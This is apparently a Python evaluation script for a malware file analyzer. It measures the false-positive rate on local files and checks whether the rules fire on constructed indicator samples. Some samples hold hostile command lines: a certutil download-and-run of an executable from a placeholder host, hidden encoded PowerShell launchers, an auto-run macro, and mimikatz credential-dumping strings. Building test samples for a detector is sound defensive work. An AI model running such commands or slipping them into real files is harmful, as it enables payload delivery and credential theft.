"""File-analyzer evaluation.

Two sets, both stated plainly in docs/detection-evaluation.md:
  * ordinary files taken from a folder on this machine (real data; false-positive rate), and
  * constructed samples that contain the indicators the analyzer looks for (NOT real malware: this checks the rules
    fire, it does not measure detection of live threats).
"""
import io
import os
import random
import zipfile
from pathlib import Path
from typing import List, Optional, Tuple

from app.services.file_analyzer import file_analyzer
from app.services.phishing_engine import ALERT_SCORE, SUSPICIOUS_SCORE

MAX_REAL_FILES = 1500


def pe_stub(extra: bytes = b"") -> bytes:
    """A minimal valid-looking PE header; enough for the analyzer's format check, not runnable."""
    dos = bytearray(b"MZ" + b"\x00" * 58 + (0x80).to_bytes(4, "little")) + b"\x00" * 64
    return bytes(dos) + b"PE\x00\x00" + b"\x4c\x01" + (3).to_bytes(2, "little") + b"\x00" * 200 + extra


def zip_bytes(name="a.txt", data=b"hello world " * 400, extra_name=None):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(name, data)
        if extra_name:
            z.writestr(extra_name, b"\x00binary")
    return buf.getvalue()


def constructed() -> List[Tuple[str, str, bytes, int]]:
    rnd = random.Random(1)
    noise = bytes(rnd.getrandbits(8) for _ in range(60_000))
    return [
        # (name, filename, content, label) label 1 = should be flagged
        ("empty file", "empty.txt", b"", 0),
        ("plain text note", "notes.txt", b"Meeting notes: discuss bitcoin treasury policy and ransom insurance renewal.\n" * 20, 0),
        ("python source", "tool.py", b"import os\nfor p in os.listdir('.'):\n    print(p)\n", 0),
        ("admin PowerShell", "backup.ps1", b"Get-ChildItem C:\\Data | Copy-Item -Destination D:\\Backup -Recurse\n", 0),
        ("batch file", "start.bat", b"@echo off\necho starting service\nnet start spooler\n", 0),
        ("zip archive", "report.zip", zip_bytes(), 0),
        ("docx-like zip", "report.docx", zip_bytes("word/document.xml"), 0),
        ("pdf", "invoice.pdf", b"%PDF-1.7\n" + zip_bytes(data=noise)[:20000] + b"\n%%EOF", 0),
        ("png image", "logo.png", b"\x89PNG\r\n\x1a\n" + noise, 0),
        ("jpeg photo", "photo.jpg", b"\xff\xd8\xff\xe0" + noise, 0),
        ("benign executable", "setup.exe", pe_stub(b"This program installs the application.\x00" * 40), 0),
        ("csv export", "data.csv", b"id,name\n" + b"\n".join(b"%d,user%d" % (i, i) for i in range(2000)), 0),
        # --- indicators present
        ("encoded PowerShell", "update.ps1", b"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand aQBlAHgA", 1),
        ("LotL download", "run.bat", b"cmd.exe /c certutil -urlcache -split -f http://x.test/a.exe a.exe && a.exe", 1),
        ("ransom note", "README.txt", b"YOUR_FILES_ARE_ENCRYPTED. Your files have been encrypted. Pay the ransom in bitcoin to decrypt.", 1),
        ("credential dumper strings", "tool.bin", b"sekurlsa::logonpasswords mimikatz lsass.dmp", 1),
        ("injection APIs", "loader.bin", b"VirtualAllocEx WriteProcessMemory CreateRemoteThread kernel32", 1),
        ("executable posing as PDF", "invoice.pdf", pe_stub(b"payload" * 100), 1),
        ("macro Office file", "salary.xlsm", zip_bytes("xl/workbook.xml", extra_name="xl/vbaProject.bin"), 1),
        ("auto-run macro text", "macro.vbs", b'Sub AutoOpen()\nCreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc AAAA"\nEnd Sub', 1),
        ("packed executable", "tool.exe", pe_stub(noise), 1),
        ("EICAR test file", "eicar.com", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", 1),
    ]


def real_files(root: Path) -> List[Path]:
    files = []
    for dirpath, _, names in os.walk(root):
        for n in names:
            p = Path(dirpath) / n
            try:
                if p.is_file() and not p.is_symlink() and 0 < p.stat().st_size <= 4_000_000:
                    files.append(p)
            except OSError:
                continue
    random.Random(3).shuffle(files)
    return files[:MAX_REAL_FILES]


def evaluate_files(benign_root: Optional[Path]):
    out = {}
    rows = [(n, file_analyzer.analyze_file_bytes(f, c).risk_score, y) for n, f, c, y in constructed()]
    out["constructed"] = {
        "n": len(rows),
        "benign_flagged": [n for n, s, y in rows if not y and s >= SUSPICIOUS_SCORE],
        "indicators_missed": [n for n, s, y in rows if y and s < SUSPICIOUS_SCORE],
        "indicators_alerted": f"{sum(s >= ALERT_SCORE for _, s, y in rows if y)}/{sum(y for _, _, y in rows)}",
    }
    if benign_root:
        scores, flagged = [], []
        for p in real_files(benign_root):
            try:
                s = file_analyzer.analyze_file_bytes(p.name, p.read_bytes()).risk_score
            except (OSError, ValueError):
                continue
            scores.append(s)
            if s >= SUSPICIOUS_SCORE:
                flagged.append((p.name, s))
        out["real_benign_files"] = {"n": len(scores), "flagged_suspicious": len(flagged),
                                    "flagged_alert": sum(s >= ALERT_SCORE for _, s in flagged),
                                    "rate": f"{100 * len(flagged) / max(len(scores), 1):.2f}%", "examples": flagged[:10]}
    return out
